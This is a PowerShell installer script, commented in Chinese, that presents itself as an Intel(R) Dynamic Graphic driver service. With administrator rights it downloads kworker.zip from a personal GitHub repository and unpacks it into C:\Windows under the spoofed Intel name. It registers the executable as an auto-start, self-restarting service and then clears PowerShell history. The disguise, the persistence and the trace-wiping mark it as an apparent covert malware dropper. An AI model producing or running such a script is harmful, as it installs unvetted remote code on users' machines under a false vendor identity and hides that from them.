# Intel(R) Dynamic Graphic Windows 一键安装脚本
# 必须以管理员身份运行

# 设置变量
$ServiceName = "Intel(R) Dynamic Graphic"
$InstallDir = "C:\Windows\Intel(R) Dynamic Graphic"
$DownloadUrl = "https://raw.githubusercontent.com/wondream322/kworker/master/win/kworker.zip"
$ExeName = "Intel(R) Dynamic Graphic.exe"
$ConfigName = "c"

# 设置控制台编码
chcp 65001 > $null

# 颜色输出函数
function Write-Info { Write-Host "[信息] $args" -ForegroundColor Cyan }
function Write-Success { Write-Host "[成功] $args" -ForegroundColor Green }
function Write-Warning { Write-Host "[警告] $args" -ForegroundColor Yellow }
function Write-Error { Write-Host "[错误] $args" -ForegroundColor Red }

# 检查管理员权限
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "请以管理员身份运行此脚本"
    Write-Host "右键点击 PowerShell -> 以管理员身份运行，然后执行: .\install.ps1"
    exit 1
}

Write-Host "=========================================="
Write-Host "   Intel(R) Dynamic Graphic 一键安装脚本"
Write-Host "=========================================="
Write-Host ""

# 创建安装目录
Write-Info "正在创建安装目录..."
if (-not (Test-Path $InstallDir)) {
    try {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    } catch {
        Write-Error "创建目录失败: $_"
        exit 1
    }
}
Write-Success "目录创建成功: $InstallDir"

# 下载文件
Write-Info "正在下载程序包..."
$zipPath = "$InstallDir\kworker.zip"
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $zipPath -UseBasicParsing
} catch {
    Write-Error "下载失败: $_"
    Write-Error "下载地址: $DownloadUrl"
    exit 1
}
Write-Success "下载完成"

# 解压文件
Write-Info "正在解压文件..."
try {
    Expand-Archive -Path $zipPath -DestinationPath $InstallDir -Force
} catch {
    Write-Error "解压失败: $_"
    exit 1
}
Write-Success "解压完成"

# 清理临时文件
Write-Info "正在清理临时文件..."
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# 检查可执行文件
$exePath = "$InstallDir\$ExeName"
if (-not (Test-Path $exePath)) {
    Write-Error "未找到 $ExeName，请检查压缩包内容"
    Write-Info "压缩包应包含: $ExeName, $ConfigName"
    exit 1
}
Write-Success "找到可执行文件: $ExeName"

# 检查配置文件
$configPath = "$InstallDir\$ConfigName"
if (-not (Test-Path $configPath)) {
    Write-Warning "未找到配置文件 $ConfigName，将使用默认配置"
} else {
    Write-Success "找到配置文件: $ConfigName"
}

# 删除旧服务（如果存在）
Write-Info "检查是否存在旧服务..."
$existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existingService) {
    Write-Info "停止并删除旧服务..."
    try {
        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        sc.exe delete "`"$ServiceName`"" | Out-Null
        Start-Sleep -Seconds 1
    } catch {
        Write-Warning "删除旧服务时出现警告: $_"
    }
}

# 创建 Windows 服务
Write-Info "正在创建 Windows 服务..."
$binPath = "`"$exePath`" --config=`"$configPath`""
try {
    # 服务名包含空格和特殊字符，需要用引号括起来
    & sc.exe create "`"$ServiceName`"" binPath= $binPath start= auto DisplayName= $ServiceName | Out-Null
    
    # 检查服务是否创建成功
    $newService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if (-not $newService) {
        throw "服务创建失败，请检查错误信息"
    }
} catch {
    Write-Error "服务创建失败: $_"
    exit 1
}

# 设置服务描述
& sc.exe description "`"$ServiceName`"" "Intel 动态图形管理服务" | Out-Null
Write-Success "服务创建成功"

# 设置服务恢复选项（服务失败时自动重启）
Write-Info "配置服务恢复选项..."
& sc.exe failure "`"$ServiceName`"" reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null

# 启动服务
Write-Info "正在启动服务..."
try {
    Start-Service -Name $ServiceName -ErrorAction Stop
    Start-Sleep -Seconds 2
} catch {
    Write-Error "服务启动失败: $_"
    # 显示详细错误信息
    Get-Service -Name $ServiceName | Format-List
    exit 1
}

# 检查服务状态
$service = Get-Service -Name $ServiceName
if ($service.Status -eq 'Running') {
    Write-Success "服务已成功启动"
} else {
    Write-Warning "服务状态: $($service.Status)"
}

# 设置开机自启
Write-Info "设置开机自启..."
Set-Service -Name $ServiceName -StartupType Automatic

# 输出完成信息
Write-Host ""
Write-Host "=========================================="
Write-Success "Intel(R) Dynamic Graphic 安装完成！"
Write-Host "=========================================="
Write-Host "安装目录: $InstallDir"
Write-Host "服务名称: $ServiceName"
Write-Host "服务状态: $($service.Status)"
Write-Host ""
Write-Host "常用命令:"
Write-Host "  查看状态: Get-Service `"$ServiceName`""
Write-Host "  启动服务: Start-Service `"$ServiceName`""
Write-Host "  停止服务: Stop-Service `"$ServiceName`""
Write-Host "  重启服务: Restart-Service `"$ServiceName`""
Write-Host "  删除服务: sc.exe delete `"$ServiceName`""
Write-Host ""
Write-Host "管理工具: 运行 services.msc 查看服务列表"
Write-Host "=========================================="

# 清理 PowerShell 历史记录
Clear-History
Write-Success "安装日志已清理"

# 等待用户确认
Write-Host ""
Write-Host "按任意键退出..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
